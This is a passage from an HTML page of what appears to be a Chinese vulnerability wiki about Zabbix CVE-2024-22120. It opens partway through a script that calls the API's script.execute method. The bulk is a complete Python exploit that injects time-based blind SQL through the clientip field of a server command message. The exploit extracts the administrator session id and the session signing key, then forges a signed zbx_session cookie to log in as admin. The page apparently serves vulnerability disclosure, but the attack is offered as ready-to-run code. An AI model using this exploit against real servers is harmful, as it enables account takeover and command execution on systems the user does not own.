        <span class="s2">&quot;auth&quot;</span><span class="p">:</span> <span class="n">auth</span><span class="p">[</span><span class="s1">&#39;result&#39;</span><span class="p">],</span>
        <span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">cmd_upd</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;jsonrpc&quot;</span><span class="p">:</span> <span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
        <span class="s2">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;script.execute&quot;</span><span class="p">,</span>
        <span class="s2">&quot;params&quot;</span><span class="p">:</span> <span class="p">{</span>
            <span class="s2">&quot;scriptid&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
            <span class="s2">&quot;hostid&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span> <span class="o">+</span> <span class="n">host_id</span> <span class="o">+</span> <span class="s2">&quot;&quot;</span>
        <span class="p">},</span>
        <span class="s2">&quot;auth&quot;</span><span class="p">:</span> <span class="n">auth</span><span class="p">[</span><span class="s1">&#39;result&#39;</span><span class="p">],</span>
        <span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">cmd_exe</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="n">cmd_exe_json</span> <span class="o">=</span> <span class="n">cmd_exe</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
    <span class="k">if</span> <span class="s2">&quot;error&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">cmd_exe</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">cmd_exe_json</span><span class="p">[</span><span class="s2">&quot;result&quot;</span><span class="p">][</span><span class="s2">&quot;value&quot;</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">cmd_exe_json</span><span class="p">[</span><span class="s2">&quot;error&quot;</span><span class="p">][</span><span class="s2">&quot;data&quot;</span><span class="p">])</span>
</code></pre></div>
<h2 id="session-idsession-keyzbx_session">利用获取到的管理员session id和session key构造zbx_session登录管理界面<a class="headerlink" href="#session-idsession-keyzbx_session" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hmac</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span>

<span class="k">def</span><span class="w"> </span><span class="nf">SendMessage</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">injection</span><span class="p">):</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;CRITICAL&quot;</span>
    <span class="n">zbx_header</span> <span class="o">=</span> <span class="s2">&quot;ZBXD</span><span class="se">\x01</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
    <span class="n">message</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;request&quot;</span><span class="p">:</span> <span class="s2">&quot;command&quot;</span><span class="p">,</span>
        <span class="s2">&quot;sid&quot;</span><span class="p">:</span> <span class="n">sid</span><span class="p">,</span>
        <span class="s2">&quot;scriptid&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
        <span class="s2">&quot;clientip&quot;</span><span class="p">:</span> <span class="s2">&quot;&#39; + &quot;</span> <span class="o">+</span> <span class="n">injection</span> <span class="o">+</span> <span class="s2">&quot;+ &#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;hostid&quot;</span><span class="p">:</span> <span class="n">hostid</span>
    <span class="p">}</span>
    <span class="n">message_json</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
    <span class="n">message_length</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;q&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">message_json</span><span class="p">))</span>
    <span class="n">message</span> <span class="o">=</span> <span class="n">zbx_header</span> <span class="o">+</span> <span class="n">message_length</span> <span class="o">+</span> <span class="n">message_json</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">&quot;CRITICAL&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span><span class="w"> </span><span class="nf">ExtractConfigSessionKey</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">time_false</span><span class="p">,</span> <span class="n">time_true</span><span class="p">):</span>
    <span class="n">token</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
    <span class="n">token_length</span> <span class="o">=</span> <span class="mi">32</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">token_length</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s2">&quot;abcdef&quot;</span><span class="p">:</span>
            <span class="n">before_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
            <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;(select CASE WHEN (ascii(substr((select session_key from config),</span><span class="si">%d</span><span class="s2">,1))=</span><span class="si">%d</span><span class="s2">) THEN sleep(</span><span class="si">%d</span><span class="s2">) ELSE sleep(</span><span class="si">%d</span><span class="s2">) END)&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="n">time_true</span><span class="p">,</span> <span class="n">time_false</span><span class="p">)</span>
            <span class="n">SendMessage</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">query</span><span class="p">)</span>
            <span class="n">after_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">time_true</span> <span class="o">&gt;</span> <span class="p">(</span><span class="n">after_query</span><span class="o">-</span><span class="n">before_query</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">time_false</span><span class="p">:</span>
                <span class="k">continue</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">token</span> <span class="o">+=</span> <span class="n">c</span>
                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) session_key=</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">token</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
                <span class="k">break</span>
    <span class="k">return</span> <span class="n">token</span>


<span class="k">def</span><span class="w"> </span><span class="nf">ExtractAdminSessionId</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">time_false</span><span class="p">,</span> <span class="n">time_true</span><span class="p">):</span>
    <span class="n">session_id</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
    <span class="n">token_length</span> <span class="o">=</span> <span class="mi">32</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">token_length</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s2">&quot;abcdef&quot;</span><span class="p">:</span>
            <span class="n">before_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
            <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),</span><span class="si">%d</span><span class="s2">,1))=</span><span class="si">%d</span><span class="s2">) THEN sleep(</span><span class="si">%d</span><span class="s2">) ELSE sleep(</span><span class="si">%d</span><span class="s2">) END)&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="n">time_true</span><span class="p">,</span> <span class="n">time_false</span><span class="p">)</span>
            <span class="n">SendMessage</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">query</span><span class="p">)</span>
            <span class="n">after_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">time_true</span> <span class="o">&gt;</span> <span class="p">(</span><span class="n">after_query</span><span class="o">-</span><span class="n">before_query</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">time_false</span><span class="p">:</span>
                <span class="k">continue</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">session_id</span> <span class="o">+=</span> <span class="n">c</span>
                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) session_id=</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">session_id</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
                <span class="k">break</span>
    <span class="k">return</span> <span class="n">session_id</span>

<span class="k">def</span><span class="w"> </span><span class="nf">GenerateAdminSession</span><span class="p">(</span><span class="n">sessionid</span><span class="p">,</span> <span class="n">session_key</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">sign</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">session_key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">),</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">prepare_data</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">dict</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
        <span class="n">sorted_data</span> <span class="o">=</span> <span class="n">OrderedDict</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">items</span><span class="p">())</span>
        <span class="n">sorted_data</span><span class="p">[</span><span class="s1">&#39;sign&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">sign</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">sorted_data</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;:&#39;</span><span class="p">)))</span>
        <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">sorted_data</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>

    <span class="n">session</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;sessionid&quot;</span><span class="p">:</span> <span class="n">sessionid</span><span class="p">,</span>
        <span class="s2">&quot;serverCheckResult&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
        <span class="s2">&quot;serverCheckTime&quot;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
    <span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">prepare_data</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span>

<span class="k">def</span><span class="w"> </span><span class="nf">CheckAdminSession</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">admin_session</span><span class="p">):</span>
    <span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;https&quot;</span><span class="p">:</span> <span class="s2">&quot;http://127.0.0.1:8083&quot;</span><span class="p">,</span>
        <span class="s2">&quot;http&quot;</span><span class="p">:</span> <span class="s2">&quot;http://127.0.0.1:8083&quot;</span>
    <span class="p">}</span>
    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">/zabbix.php?action=dashboard.view&quot;</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Cookie&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;zbx_session=</span><span class="si">{</span><span class="n">admin_session</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="p">}</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">)</span>
    <span class="k">if</span> <span class="s2">&quot;Administration&quot;</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">admin_session</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="kc">None</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">&quot;CVE-2024-22120-LoginAsAdmin&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--false_time&quot;</span><span class="p">,</span>
                        <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Time to sleep in case of wrong guess(make it smaller than true time, default=1)&quot;</span><span class="p">,</span>
                        <span class="n">default</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--true_time&quot;</span><span class="p">,</span>
                        <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Time to sleep in case of right guess(make it bigger than false time, default=10)&quot;</span><span class="p">,</span>
                        <span class="n">default</span><span class="o">=</span><span class="s2">&quot;10&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--ip&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Zabbix server IP&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--port&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Zabbix server port(default=10051)&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;10051&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--sid&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Session ID of low privileged user&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--hostid&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;hostid of any host accessible to user with defined sid&quot;</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="n">admin_sessionid</span> <span class="o">=</span> <span class="n">ExtractAdminSessionId</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">),</span> <span class="n">args</span><span class="o">.</span><span class="n">sid</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">hostid</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">false_time</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">true_time</span><span class="p">))</span>
    <span class="n">session_key</span> <span class="o">=</span> <span class="n">ExtractConfigSessionKey</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">),</span> <span class="n">args</span><span class="o">.</span><span class="n">sid</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">hostid</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">false_time</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">true_time</span><span class="p">))</span>
    <span class="n">admin_session</span> <span class="o">=</span> <span class="n">GenerateAdminSession</span><span class="p">(</span><span class="n">admin_sessionid</span><span class="p">,</span> <span class="n">session_key</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">CheckAdminSession</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">ip</span><span class="p">,</span> <span class="n">admin_session</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">res</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;try replace cookie with:</span><span class="se">\n</span><span class="s2">zbx_session=</span><span class="si">{</span><span class="n">res</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;failed&quot;</span><span class="p">)</span>
</code></pre></div>
<h2 id="_1">漏洞来源<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://mp.weixin.qq.com/s/vF0xkB-j_HjI0pcQoh94KQ">https://mp.weixin.qq.com/s/vF0xkB-j_HjI0pcQoh94KQ</a></li>
<li><a href="https://github.com/W01fh4cker/CVE-2024-22120-RCE">https://github.com/W01fh4cker/CVE-2024-22120-RCE</a></li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Zabbix%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-42327%29/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Zabbix%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-42327%29/" class="btn btn-xs btn-link">
        Zabbix SQL注入漏洞(CVE-2024-42327)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Zabbix%20SAML%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2022-23131/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Zabbix%20SAML%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2022-23131/" class="btn btn-xs btn-link">
        Zabbix SAML身份绕过漏洞 CVE-2022-23131
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>